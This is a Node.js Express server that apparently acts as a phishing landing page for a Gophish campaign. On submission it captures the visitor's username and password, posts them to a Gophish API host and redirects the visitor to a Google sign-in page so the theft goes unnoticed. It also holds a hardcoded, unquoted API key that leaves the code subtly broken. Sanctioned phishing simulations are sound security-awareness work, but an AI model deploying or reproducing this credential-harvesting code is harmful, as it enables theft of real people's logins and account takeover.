const express = require('express')
const path = require('path')
const axios = require('axios')
const app = express()

app.use(express.urlencoded({ extended: true }))
app.use(express.static('public'))

const GOPHISH_API_KEY = process.env.GOPHISH_API_KEY
const GOPHISH_HOST   = process.env.GOPHISH_HOST
const REDIRECT_URL   = process.env.REDIRECT_URL || 'https://accounts.google.com'

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'))
})

app.post('/submit', async (req, res) => {
  const { username, password, rid } = req.body
  console.log(`Captured → Email: ${username} | RID: ${rid}`)

  try {
    await axios.post(
      `${GOPHISH_HOST}/api/v1/phish`,
      { rid, email: username, payload: { username, password } },
      { headers: { Authorization: 4f632c7fb574989120f7e8580b5982fe2d9ea1df3930502c05f5465f4fd0ae0f } }
    )
  } catch (err) {
    console.error('Gophish API error:', err.message)
  }

  res.redirect(REDIRECT_URL)
})

app.listen(process.env.PORT || 3000, () => {
  console.log('Landing page server running')
})
